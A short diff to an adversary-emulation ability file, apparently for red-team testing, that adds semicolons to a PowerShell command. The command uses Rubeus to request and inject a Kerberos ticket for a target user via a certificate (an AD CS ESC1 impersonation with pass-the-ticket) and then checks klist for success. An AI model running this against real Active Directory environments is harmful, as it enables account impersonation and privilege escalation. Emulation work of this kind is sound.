@@ -15,11 +15,11 @@
           - Rubeus.exe
         command: |
           .\Rubeus.exe asktgt /user:#{esc1.target_user} /certificate:"CN=#{esc1.target_user}" /ptt
-          klist | findstr.exe "#{esc1.target_user}"
+          klist | findstr.exe "#{esc1.target_user}";
           if ($LASTEXITCODE -eq 0) {
-              Write-Host "TGT-Injection-Success: #{esc1.target_user}"
+              Write-Host "TGT-Injection-Success: #{esc1.target_user}";
           } else {
-              Write-Host "TGT-Injection-Failure: #{esc1.target_user}"
+              Write-Host "TGT-Injection-Failure: #{esc1.target_user}";
           }
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
